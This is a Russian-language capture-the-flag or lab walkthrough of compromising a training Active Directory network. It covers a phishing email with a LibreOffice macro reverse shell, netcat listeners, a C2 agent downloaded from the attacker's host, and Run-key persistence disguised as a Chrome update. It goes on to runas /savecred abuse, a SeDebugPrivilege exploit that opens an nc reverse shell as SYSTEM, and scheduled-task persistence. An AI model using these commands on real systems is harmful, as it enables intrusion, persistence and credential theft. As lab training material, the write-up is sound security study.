---
title: Active Directory для чайников часть 2
draft: false
tags:
  - activedirectory
  - knightpentest
  - ctf
  - pentest
  - redteam
---
# Вступление

Салют! Данный материал был выпущен специально для блога по информационной безопасности [@mirea](https://t.me/mirea) подписывайся там будет много интересного контента🎇

не забываем заходить в чат [@greyhatchat](https://t.me/greyhatchat) тут вы можете найти потенциальных коллег. Ведем себя культурно=)

# Небольшое напутствие

Если кто-то не понимает большую часть информации - это нормально. Я сам еще и близко не разобрался в теме, лишь делюсь своим опытом. Это просто мои заметки, чтобы я мог их перечитать через некоторое время и сравнить изменения.

Нужно понимать, что все приходит только с практикой. 

# Цель

Скомпрометировать выдуманную компанию. На руках у нас есть почтовый аккаунт с которого требуется заслать письмо сотруднику, который обычно работает с офисными документами.

сеть **10.112.0.0/24**
почтовый сервер **10.109.0.100**

**Учетные данные для входа на почтовый сервер:**  
- Логин – student1337@company.lab  
- Пароль – Pass123$1

# Сканируем сетку

Первым делом, что я буду делать - это сканировать всю доступную сетку на наличие открытых портов. Мне нужно понять сколько активных хостов в сети и что на них валяется, чтобы уже сообразить как это дело можно поломать.


![[Pasted image 20241112161606.png]]

пока все это дело сканируется мы пойдем дальше, не будем зря время тратить.

# Генерируем макрос

![[Pasted image 20241112162044.png]]

Я написал в гугле "github reverse shell macro". И нашел данный скрипт. Он довольно удобный. Склонировал себе на тачку, прописал ip port машины, где прослушиваешь входящее соединение и ждем.

![[Pasted image 20241112162336.png]]

Какой впн адрес мне выдал тот я и прописываю, чтобы далее бот, который откроет мой файл с макросом мог до меня достучаться. Порт ввожу любой доступный к примеру 31337

Включаем лисенер

```
nc -lnvp 31337
```

![[Pasted image 20241112162522.png]]

![[Pasted image 20241112162805.png]]

Тут я вспомнил, что у меня нет офиса. Пришлось его скачивать...

```
sudo apt update
sudo apt install libreoffice
```


> [!NOTE]
> Еще со временем школы не дружил с офисными программами. Такая скучная темка. Бывало ехал в общественном транспорте, а там ботан залипает в моник таблички excel делает. ФУ! Скукота. Самая конченая работа.  Ну это сугубо мое мнение естественно. То чем мы с вами сейчас занимаемся - это тоже не самая интересная работа, дальше должно быть чуть интереснее.

После установки либры запускаем нужный софт

```
libreoffice --calc
```


LibreOffice Calc поддерживает макросы в следующих форматах файлов:

1. **.ODS (OpenDocument Spreadsheet)** – основной формат для LibreOffice Calc, поддерживающий макросы на языке LibreOffice Basic.
2. **.XLS и .XLSM (Excel)** – LibreOffice может открывать файлы Excel с макросами (в формате .XLS или .XLSM), но функциональность макросов может быть ограничена из-за различий между VBA (используемым в Excel) и LibreOffice Basic.
3. **.ODT (OpenDocument Text)** – для макросов в текстовых документах LibreOffice Writer, но Calc может использовать общие макросы, написанные в ODT и других модулях LibreOffice.

Также LibreOffice поддерживает макросы на **Python**, **JavaScript**, и **BeanShell**. Их можно писать и запускать через меню **Инструменты > Макросы > Управление макросами**.

Нас интересует формат .ODS, так было указано в задании.

![[Pasted image 20241112165138.png]]

Tools --> Macros --> Organize Macros --> Basic

Вставляем макрос, который мы сгенерировали через питон.

![[Pasted image 20241112190932.png]]

Сохраняем данный макрос. И переходим в Tools --> Customize

![[Pasted image 20241112191112.png]]

Задаем правила что бы при открытии и закрытии срабатывал макрос с открытием сокета

Сохраняем файл. Если что-то не понятно, то в интернете есть полно гайдов как создавать макросы для либры в формате .ods. Можете посмотреть. Но суть простая запускается файл, а вместе с ним макрос, который выполняет команду для powershell и к нам подключается зараженная машина. Точнее мы получаем шелл=)) Сейчас все покажу.

# Отпрвавляем файл с макросом по почте

И так мы сгенерили макрос. Включили прослушиватель на 31337 порту. Теперь отправляем этот файл.

![[Pasted image 20241112191624.png]]


> [!NOTE]
> Стоит учитывать момент, что к вашему лисенеру может подключиться только устройство. Как только подключается кто-то порт занят.


![[Pasted image 20241112192035.png]]

Всё хорошо, теперь у нас есть шелл. Зальем агента C2 для удобства. Как работать с Havoc описано в предудыщей статье, в телеграм канале и в официальной документации. Еще можете видеоролик рыжего посмотреть на ютубе=)

# Закрепляемся в системе

![[Pasted image 20241112193155.png]]

Тут я начинаю понимать, что шелл слетает. Сбрасывается подключение. Нормально работать не получится с таким таймингом. Я пошел искать способы закрепиться в системе.

curl по каким-то причинам не работал. Пришлось использовать "iwr"

```
iwr http://10.0.0.114:8080/x2.exe -out x2.exe
```

Запускаем агента

```
.\x2
```

![[Pasted image 20241112200254.png]]

Ну вот собственно получили сессию, но как видно она сдохла. Проверим удаляется хоть наш агент после разрыва сессии или остается в той же директории. Выполним предыдущие шаги еще раз.

![[Pasted image 20241112200703.png]]

Да, все четко файл сохраняется. Остается сделать так, чтобы он автоматически запускался.

Я пробовал разные варианты например вот так

```
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v GoogleChromeUpdatex2 /t REG_SZ /d "c:\windows\tasks\x2.exe" /f

```

или

```
cmd.exe reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v GoogleChromeUpdatex2 /t REG_SZ /d "c:\windows\tasks\x2.exe" /f

```

Мимо. Шелл какой-то нехороший попался походу. Поэтому пришлось всё таки работать из под C2

```
shell reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v GoogleChromeUpdatex2 /t REG_SZ /d "c:\windows\tasks\x2.exe" /f

```

![[Pasted image 20241112202530.png]]

Прекрасно у нас есть закреп, теперь мы можем продолжать работу!

# Повышаем привилегии

Первое, что я сделал это прочитал историю команд в powershell

```
shell type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```


![[Pasted image 20241112203208.png]]

Как видим после разрыва сессии появляется новая, т.к пользователь входит в систему=) 

> [!NOTE]
> runas /savecred /user:Р°Р?Р?РёР?РёС?С'С?Р°С'Р?С? cmd
> 
> exit
> 
> cmdkey /list
> 
> cmdkey /delete:"Domain:interactive=TERMINAL\Р°Р?Р?РёР?РёС?С'С?Р°С'Р?С?"

Вот и нашелся потенциальный вариант для повышения привилегий.

![[Pasted image 20241112204658.png]]

Даем права всем на исполнение нашего C2

```
icacls "c:\windows\tasks\x2.exe" /grant *S-1-1-0:(RX)
```

```
runas /savecred /user:TERMINAL\svc "c:\windows\tasks\x2.exe"
```

### Как работает `/savecred`

> [!NOTE]
> Когда вы используете `/savecred` вместе с `runas`, Windows запросит пароль для указанного пользователя (в данном случае `TERMINAL\svc`) только один раз. После этого Windows сохранит эти учетные данные в **Диспетчере учетных данных**. При последующих запусках команды с этим же параметром `/savecred` и тем же пользователем, пароль вводить уже не потребуется.

![[Pasted image 20241112205430.png]]

Все теперь мы можем рбаотать от имени svc. Не забываем снова закрепиться.

```
shell reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v GoogleChromeUpdatex2 /t REG_SZ /d "c:\windows\tasks\x2.exe" /f
```

# Повышаемся до уровня системы

Идея заключается в следующем: если у нас есть привилегия `SeDebugPrivilege`, то мы можем использовать инструмент с GitHub [bruno-1337/SeDebugPrivilege-Exploit](https://github.com/bruno-1337/SeDebugPrivilege-Exploit/releases) для запуска `nc.exe` (или аналогичной программы) от имени `SYSTEM`. Это позволит получить доступ к командной оболочке с системными правами.

Стоит учитывать тот факт


> [!NOTE]
> Привилегия резервного копирования
> Система должна предоставить весь контроль доступа на чтение к любому файлу (ограниченный операциями чтения) с помощью этой привилегии. Он используется для чтения хэшей паролей локальных учетных записей администратора из реестра, после чего такие инструменты, как "psexec" или "wmiexec", могут быть использованы с хэшем (метод Pass-the-Hash). Однако этот метод не работает при двух условиях: когда учетная запись локального администратора отключена или когда существует политика, которая удаляет административные права у локальных администраторов, подключающихся удаленно

В havoc есть готовый модуль для включения данной привилегии. Логично, что если мы ее не включим, то эксплоит не сработает. Обязательно учитывайте тот факт, что эту команду нужно вводить каждый раз, когда вы подключаетесь к новой сессии. 

```
token privs-get SeDebugPrivilege
```

![[Pasted image 20241114222435.png]]

Теперь посмотрим PID, который запущен от имени системы

```
tasklist /v
```

![[Pasted image 20241114222528.png]]

Я выберу любой процесс с svchost и включу прослушиватель на любом доступном порту. 

```
nc -nlvp 31337
```

Ну и собственно говоря запускаем эксплоит и получаем шелл.
```
shell sdp.exe 1548 "c:\windows\tasks\nc.exe 10.0.0.114 31337 -e cmd"
```

![[Pasted image 20241114222712.png]]
![[Pasted image 20241114223831.png]]

![[Pasted image 20241114223856.png]]

Закреплялся я через планировщик 

```
schtasks /create /tn DiskPentestera /tr "c:\windows\tasks\x2.exe" / sc onstart /ru SYSTEM /f
```

Ну дальше как обычно сливаем локальные креды и снова фаззим сетку. На этом пока что остановимся=)

